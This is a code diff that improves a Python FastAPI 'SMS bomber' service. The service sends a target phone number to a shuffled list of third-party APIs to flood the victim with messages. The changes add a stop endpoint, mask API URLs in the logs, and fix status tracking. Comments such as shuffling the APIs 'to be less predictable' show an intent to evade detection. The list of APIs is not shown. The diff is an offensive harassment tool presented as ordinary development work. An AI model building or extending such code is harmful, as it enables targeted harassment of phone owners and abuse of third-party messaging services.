@@ -64,8 +64,10 @@ class BombRequest(BaseModel):
 
 # In-memory status tracking
 bombing_status = {}
+stop_signals = set()
 
 async def send_bomb(phone: str, count: int, bomb_id: str):
+    # Ensure total and sent are always integers to prevent NaN on frontend
     bombing_status[bomb_id] = {"status": "running", "sent": 0, "total": count, "logs": []}
     
     # Shuffle APIs to be less predictable
@@ -77,6 +79,12 @@ async def send_bomb(phone: str, count: int, bomb_id: str):
     max_to_send = min(count, len(local_apis))
     
     for i in range(max_to_send):
+        if bomb_id in stop_signals:
+            bombing_status[bomb_id]["status"] = "stopped"
+            bombing_status[bomb_id]["logs"].append("Operation stopped by user.")
+            stop_signals.remove(bomb_id)
+            return
+
         api = local_apis[i]
         url = api["url"]
         method = api["method"]
@@ -94,10 +102,12 @@ async def send_bomb(phone: str, count: int, bomb_id: str):
                 else:
                     payload = data_func.replace("{phone}", phone)
             except Exception as e:
-                print(f"Error formatting data for {url}: {e}")
                 continue
 
         try:
+            # Mask URL for logs
+            masked_url = f"API_{i+1} [****{url[-4:] if len(url)>4 else ''}]"
+            
             # Use a timeout to not get stuck
             if method == "POST":
                 # Handle string vs dict payload
@@ -114,10 +124,12 @@ async def send_bomb(phone: str, count: int, bomb_id: str):
             
             sent_count += 1
             bombing_status[bomb_id]["sent"] = sent_count
-            bombing_status[bomb_id]["logs"].append(f"Successfully sent via {formatted_url[:30]}...")
+            bombing_status[bomb_id]["logs"].append(f"Success: {masked_url}")
             
         except Exception as e:
-            bombing_status[bomb_id]["logs"].append(f"Failed {formatted_url[:30]}...: {str(e)}")
+             # Masked log even on failure
+             masked_url = f"API_{i+1}"
+             bombing_status[bomb_id]["logs"].append(f"Failed: {masked_url}")
             
         # Small delay to avoid overloading
         await asyncio.sleep(0.5)
@@ -127,12 +139,21 @@ async def send_bomb(phone: str, count: int, bomb_id: str):
 @app.post("/api/bomb")
 async def start_bombing(request: BombRequest, background_tasks: BackgroundTasks):
     bomb_id = f"bomb_{random.randint(1000, 9999)}_{int(asyncio.get_event_loop().time())}"
+    # Pre-initialize status to avoid frontend race condition
+    bombing_status[bomb_id] = {"status": "starting", "sent": 0, "total": request.count, "logs": []}
     background_tasks.add_task(send_bomb, request.phone, request.count, bomb_id)
     return {"bomb_id": bomb_id, "message": "Bombing started"}
 
+@app.post("/api/stop/{bomb_id}")
+async def stop_bombing(bomb_id: str):
+    if bomb_id in bombing_status and bombing_status[bomb_id]["status"] == "running":
+        stop_signals.add(bomb_id)
+        return {"message": "Stop signal sent"}
+    return {"message": "Invalid bomb ID or not running"}
+
 @app.get("/api/status/{bomb_id}")
 async def get_status(bomb_id: str):
-    return bombing_status.get(bomb_id, {"status": "not_found"})
+    return bombing_status.get(bomb_id, {"status": "not_found", "sent": 0, "total": 1})
 
 if __name__ == "__main__":
     import uvicorn
